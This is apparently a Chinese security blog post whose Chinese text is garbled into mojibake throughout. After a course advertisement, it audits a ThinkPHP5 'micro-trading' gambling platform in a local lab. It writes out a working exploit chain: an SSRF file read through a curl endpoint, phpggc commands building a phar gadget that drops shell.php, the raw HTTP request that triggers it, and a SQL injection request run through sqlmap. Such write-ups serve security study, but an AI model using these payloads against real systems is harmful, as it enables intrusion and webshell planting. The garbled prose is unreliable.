#  ä»£ç å®¡è®¡èµ„é‡‘ç›˜è½¯ç›Ÿå¾®äº¤æ˜“ç³»ç»Ÿ  
moonsec  moonsec   2025-06-19 03:47  
  
```
å…è´£å£°æ˜ï¼šæœ¬å…¬ä¼—å·æ‰€æä¾›çš„æ–‡å­—å’Œä¿¡æ¯ä»…ä¾›å­¦ä¹ å’Œç ”ç©¶ä½¿ç”¨ï¼Œä¸å¾—ç”¨äºä»»ä½•éæ³•ç”¨é€”ã€‚
æˆ‘ä»¬å¼ºçƒˆè°´è´£ä»»ä½•éæ³•æ´»åŠ¨ï¼Œå¹¶ä¸¥æ ¼éµå®ˆæ³•å¾‹æ³•è§„ã€‚
è¯»è€…åº”è¯¥è‡ªè§‰éµå®ˆæ³•å¾‹æ³•è§„ï¼Œä¸å¾—åˆ©ç”¨æœ¬å…¬ä¼—å·æ‰€æä¾›çš„ä¿¡æ¯ä»äº‹ä»»ä½•è¿æ³•æ´»åŠ¨ã€‚
æœ¬å…¬ä¼—å·ä¸å¯¹è¯»è€…çš„ä»»ä½•è¿æ³•è¡Œä¸ºæ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚
```  
  
ğŸ¯ å¦‚æœä½ æ­£åœ¨å­¦ä¹ ç½‘ç»œå®‰å…¨ã€æ¸—é€æµ‹è¯•æˆ–è€…ä»£ç å®¡è®¡ï¼Œå¸Œæœ›èƒ½ç³»ç»ŸæŒæ¡ä»åŸºç¡€åˆ°å®æˆ˜çš„å®Œæ•´æŠ€èƒ½ä½“ç³»ï¼Œæˆ‘çš„æ¸—é€æµ‹è¯•è¯¾ç¨‹ç°åœ¨æ­£åœ¨è¿›è¡Œ**618é™æ—¶ç‰¹æƒ æ´»åŠ¨**  
ï¼  
  
ğŸ§  è¯¾ç¨‹å†…å®¹åŒ…å«ï¼š  
- Webæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨  
  
- å†…ç½‘æ¸—é€ä¸æ¨ªå‘ç§»åŠ¨  
  
- ä»£ç å®¡è®¡ï¼ˆPHP/Java/Netï¼‰  
  
- å®æˆ˜æ‰“ç‚¹é¡¹ç›® + çº¢é˜Ÿæ€ç»´  
  
ğŸš€ æ•™å­¦ä»¥å®æˆ˜ä¸ºä¸»ï¼Œé€‚åˆåˆå­¦è€…å’Œè¿›é˜¶é€‰æ‰‹ã€‚  
  
ğŸ ç°åœ¨æŠ¥åï¼Œäº«å— 618 é™æ—¶ä¼˜æƒ  Â è¯¾ç¨‹è¯¦ç»†Â [ã€618æ´»åŠ¨ã€‘æš—æœˆå®‰å…¨æ”»é˜²è¯¾](https://mp.weixin.qq.com/s?__biz=MzAwMjc0NTEzMw==&mid=2653589060&idx=1&sn=3693ba2df44c8cf34f519b502441ea19&scene=21#wechat_redirect)  
  
  
ğŸ“© æƒ³äº†è§£è¯¾ç¨‹å’Œå’¨è¯¢ï¼Œå¯æ·»åŠ æˆ‘å¾®ä¿¡  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADLVnPMqka8BMecE069y2SpGFVEQPwUdqQ2sn0voIhuZgWSHz6KsyBnQJjacqJrDuW1f8GLueFOWQ/640?wx_fmt=jpeg&from=appmsg "")  
  
### 1.ç®€ä»‹  
  
æ‰€è°“â€œå¾®äº¤æ˜“ç³»ç»Ÿâ€é€šå¸¸æŒ‡çš„æ˜¯ï¼š  
  
æŠ•èµ„è€…å¯¹æŸç§èµ„äº§ï¼ˆå¦‚æ±‡ç‡ã€å•†å“ã€æ¯”ç‰¹å¸ç­‰ï¼‰ä»·æ ¼çš„çŸ­æ—¶é—´æ¶¨è·Œè¿›è¡Œé¢„æµ‹ï¼›  
  
æŠ•æ³¨é‡‘é¢éå¸¸å°ï¼Œæ—¶é•¿å¾ˆçŸ­ï¼ˆå¦‚ 30 ç§’ã€60 ç§’ï¼‰ï¼›  
  
å£°ç§°â€œç¨³èµšä¸èµ”ã€ç§’ç»“æ”¶ç›Šâ€ï¼›  
  
é€šè¿‡ç³»ç»Ÿå¹³å°ä¸‹æ³¨ã€è‡ªåŠ¨åˆ¤æ–­è¾“èµ¢ã€‚  
  
å¬èµ·æ¥åƒèµŒåšï¼Ÿå¯¹ï¼Œå› ä¸ºå®ƒæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ç§é‡‘èèµŒåšè¡Œä¸ºï¼Œè€Œå¾ˆå¤šâ€œå¾®äº¤æ˜“å¹³å°â€èƒŒåçš„ç³»ç»Ÿå…¶å®å¯ä»¥åå°æ§åˆ¶æ¶¨è·Œç»“æœï¼Œæ“çºµå®¢æˆ·ç›ˆäºã€‚  
### 2.ç³»ç»Ÿæ­å»º  
  
php7.2 mysql8 apache  
  
ä½¿ç”¨phpstudyåˆ›å»ºç½‘ç«™  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADLVnPMqka8BMecE069y2Sp9FyITEWhic9A30yiaxpYpicFYCWTthh7CViaPQtc5IEgc6tdoh7qw9M8nw/640?wx_fmt=jpeg&from=appmsg "")  
  
Â åˆ›å»ºæ•°æ®åº“  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADLVnPMqka8BMecE069y2SpHT9jI34hqLXLhnOaz8mICwEQPMyUbvAtf9IZFg5saHdfvcIsarGPag/640?wx_fmt=jpeg&from=appmsg "")  
  
è¿˜éœ€è¦ä¼ªé™æ€  
```
<IfModule mod_rewrite.c>Options +FollowSymlinks -MultiviewsRewriteEngine onRewriteCond %{REQUEST_FILENAME} !-dRewriteCond %{REQUEST_FILENAME} !-fRewriteRule ^(.*)$ index.php?/$1 [QSA,PT,L]</IfModule>
```  
  
è®¾ç½®å®Œæˆåè®¿é—®  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADLVnPMqka8BMecE069y2SpmpyBurFOVo4VW0tW9r6OrLeIBicfbKxibDDlsPjzKBxyUqPAib4icAHYsA/640?wx_fmt=jpeg&from=appmsg "")  
### 3.thinkphp5åŸºç¡€çŸ¥è¯†  
  
**è®¿é—®è¯·æ±‚**  
  
ThinkPHP5.0åœ¨æ²¡æœ‰å¯ç”¨è·¯ç”±çš„æƒ…å†µä¸‹å…¸å‹çš„URLè®¿é—®è§„åˆ™æ˜¯ï¼š  
  
http://serverName/index.php  
ï¼ˆæˆ–è€…å…¶å®ƒåº”ç”¨å…¥å£æ–‡ä»¶ï¼‰/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/[å‚æ•°å/å‚æ•°å€¼...]  
  
æ”¯æŒåˆ‡æ¢åˆ°å‘½ä»¤è¡Œè®¿é—®ï¼Œå¦‚æœåˆ‡æ¢åˆ°å‘½ä»¤è¡Œæ¨¡å¼ä¸‹é¢çš„è®¿é—®è§„åˆ™æ˜¯ï¼š  
  
php.exe index.php(æˆ–è€…å…¶å®ƒåº”ç”¨å…¥å£æ–‡ä»¶ï¼‰ æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/[å‚æ•°å/å‚æ•°å€¼...]  
  
å¯ä»¥çœ‹åˆ°ï¼Œæ— è®ºæ˜¯URLè®¿é—®è¿˜æ˜¯å‘½ä»¤è¡Œè®¿é—®ï¼Œéƒ½é‡‡ç”¨PATH_INFOè®¿é—®åœ°å€ï¼Œå…¶ä¸­PATH_INFOçš„åˆ†éš”ç¬¦æ˜¯å¯ä»¥è®¾ç½®çš„ã€‚  
  
æ³¨æ„ï¼š5.0å–æ¶ˆäº†URLæ¨¡å¼çš„æ¦‚å¿µï¼Œå¹¶ä¸”æ™®é€šæ¨¡å¼çš„URLè®¿é—®ä¸å†æ”¯æŒï¼Œä½†å‚æ•°å¯ä»¥æ”¯æŒæ™®é€šæ–¹å¼ä¼ å€¼ï¼Œä¾‹å¦‚ï¼š  
  
php.exe index.php(æˆ–è€…å…¶å®ƒåº”ç”¨å…¥å£æ–‡ä»¶ï¼‰ æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ?å‚æ•°å=å‚æ•°å€¼&...  
  
å¦‚æœä¸æ”¯æŒPATHINFOçš„æœåŠ¡å™¨å¯ä»¥ä½¿ç”¨å…¼å®¹æ¨¡å¼è®¿é—®å¦‚ä¸‹ï¼š  
  
http://serverName/index.php  
ï¼ˆæˆ–è€…å…¶å®ƒåº”ç”¨å…¥å£æ–‡ä»¶ï¼‰?s=/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/[å‚æ•°å/å‚æ•°å€¼...]  
  
å¿…è¦çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŸç§æ–¹å¼ï¼Œçœç•¥URLé‡Œé¢çš„æ¨¡å—å’Œæ§åˆ¶å™¨ã€‚  
  
æ›´å¤šthinkphpçš„çŸ¥è¯†è®¿é—®Â   
https://www.kancloud.cn/manual/thinkphp5/118008  
### 3.ssrf æ¼æ´  
  
æ¼æ´æ–‡ä»¶Â application/index/controller/Api.php#curl  
  
å­˜åœ¨curlæ–¹æ³• ä½¿ç”¨curlè®¿é—®ç½‘é¡µã€‚å¯ä»¥ç›´æ¥è°ƒç”¨å­˜åœ¨ssrfæ¼æ´Â   
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADLVnPMqka8BMecE069y2Spbq6UvXqr5CXd6HlHqblg7WRD6krjNxNFyedgJPA1UBLUhL765s98jQ/640?wx_fmt=jpeg&from=appmsg "")  
  
å¯ä»¥åˆ©ç”¨å®ƒè¯»å–æœ¬åœ°æ–‡ä»¶ payload  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADLVnPMqka8BMecE069y2SpCibCOFgOBdp27OGnxnXFYO2j71oqRt1wzmlXEZiaYqMX1XSy4clySNMg/640?wx_fmt=jpeg&from=appmsg "")  
### 4.ååºåˆ—åŒ–æ¼æ´RCE  
  
thinkphp5æ˜¯å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„ æŸ¥çœ‹thinkphpçš„ç‰ˆæœ¬  
```
thinkphp\base.php
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADLVnPMqka8BMecE069y2SpanUczRCHEZU6Fp6TE7qj4wt3PSLnWQaL2SHC0zibfaqK221tdVicXM0w/640?wx_fmt=jpeg&from=appmsg "")  
  
Â å·¥å…·ä¸‹è½½Â   
https://github.com/ambionics/phpggc  
Â ç”Ÿæˆå¯¹åº”ç‰ˆæœ¬çš„ååºåˆ—åŒ–æ–‡ä»¶ã€‚  
  
åˆ—å‡º thinkphpååºåˆ—åŒ–åˆ©ç”¨é“¾Â   
```
â””â”€$ ./phpggc -l thinkphpGadget Chains-------------NAME Â  Â  Â  Â  Â  Â  VERSION Â  Â  Â  Â  TYPE Â  Â  Â  Â  Â  Â  Â  Â  Â VECTOR Â  Â  Â  Â I Â  Â ThinkPHP/FW1 Â  Â  5.0.4-5.0.24 Â  Â File write Â  Â  Â  Â  Â  Â __destruct Â  Â * Â  Â ThinkPHP/FW2 Â  Â  5.0.0-5.0.03 Â  Â File write Â  Â  Â  Â  Â  Â __destruct Â  Â * Â  Â ThinkPHP/RCE1 Â  Â 5.1.x-5.2.x Â  Â  RCE: Function Call Â  Â __destruct Â  Â * Â  Â ThinkPHP/RCE2 Â  Â 5.0.24 Â  Â  Â  Â  Â RCE: Function Call Â  Â __destruct Â  Â * Â  Â ThinkPHP/RCE3 Â  Â -6.0.1+ Â  Â  Â  Â  RCE: Function Call Â  Â __destruct Â  Â  Â  Â Â ThinkPHP/RCE4 Â  Â -6.0.1+ Â  Â  Â  Â  RCE: Function Call Â  Â __destruct Â  Â Â 
```  
  
å¯ä»¥ä½¿ç”¨ssrfæ¼æ´ä½¿ç”¨pharåè®®è§¦å‘æ¼æ´  
```
./phpggc ThinkPHP/FW1 ç›®æ ‡ç›®å½• æœ¬åœ°æ–‡ä»¶ -p phar -o test.phar./phpggc ThinkPHP/FW1 D:\\phpstudy_pro\\WWW\\www.d2.com\\shell.php 1.php -p phar -o test.phar
```  
  
é€šè¿‡æ–‡ä»¶ä¸Šä¼ æŠŠpharæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ç›®å½•  
  
æ¼æ´æ–‡ä»¶Â application/index/controller/Msm.php  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADLVnPMqka8BMecE069y2SpjM8wdytsSpWx3SLXib1QxDpDcVjoYUpPTd3hubk8ywwGicBGZ5yyBr9w/640?wx_fmt=jpeg&from=appmsg "")  
  
æ–‡ä»¶æ“ä½œå‡½æ•°èƒ½è§¦å‘pharåè®®  
```
GET /index/Msm/curl_get?url=phar://test.phar HTTP/1.1Host: www.d2.comCookie: PHPSESSID=6mqnurl9q40pi0nq654fcqlusp; think_var=zh-cn; rememberme=dkewl; pid18=3085.04004; pid11=254.2017; pid10=230.7014; pid5=53.10016; pid4=5.469; pid3=3.012; pid2=28.846; pid1=26.799Upgrade-Insecure-Requests: 1Cache-Control: max-age=0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Language: zh-CN,zh;q=0.9
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADLVnPMqka8BMecE069y2SpJ9fAwnpS00v2X7uV6dTCA6FBKnu7Rzic5rFsLOIFKZQ8Y0f9ibVuEDCw/640?wx_fmt=jpeg&from=appmsg "")  
  
åœ¨æ ¹ç›®å½•ç”Ÿæˆshellæ–‡ä»¶  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADLVnPMqka8BMecE069y2Sp72QamX6rs9SBmX9CUp0n90XR80p1AmoEEic3OXFYhuwibayQbv9x6vGA/640?wx_fmt=jpeg&from=appmsg "")  
  
è®¿é—®Â   
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADLVnPMqka8BMecE069y2SpLrvhcvvltZqItcOhOOukvalXIsUOJicmiaKBQ5gBwszVMf5STcSTuhXw/640?wx_fmt=jpeg&from=appmsg "")  
### 5.SQLæ³¨å…¥æ¼æ´  
  
æ¼æ´ä½ç½®Â application/index/controller/Goods.php#ajaxkdata  
  
åœ¨thinkphp5ä¸­ ä½¿ç”¨Â where('pid='.$pid)  
è¿™æ ·æ‹¼æ¥å­—ç¬¦ä¸²ä¼šé€ æˆSQLæ³¨å…¥  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADLVnPMqka8BMecE069y2Sp5gOwlsicF01DhPnXIzvNiardRzzmGlHicic2DQpic1M4FkQKic6iamSWgdcSw/640?wx_fmt=jpeg&from=appmsg "")  
  
payload urléœ€è¦ç™»å½•æ‰èƒ½è®¿é—®  
```
GET /index/Goods/ajaxkdata?pid=1' HTTP/1.1Host: www.d2.comCookie: PHPSESSID=6mqnurl9q40pi0nq654fcqlusp; think_var=zh-cn; rememberme=dkewl; pid18=3085.04004; pid11=254.2017; pid10=230.7014; pid5=53.10016; pid4=5.469; pid3=3.012; pid2=28.846; pid1=26.799Upgrade-Insecure-Requests: 1Cache-Control: max-age=0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Language: zh-CN,zh;q=0.9
```  
  
ä½¿ç”¨python sqlmap.py -r sql.txt --dbms mysql -v æ³¨å…¥  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Jvbbfg0s6ADLVnPMqka8BMecE069y2SpVPicfAPodCOtPIjiawP645v8PED4DqHCFVKhb2AWQ1FUBu6eX05AwkYQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
  
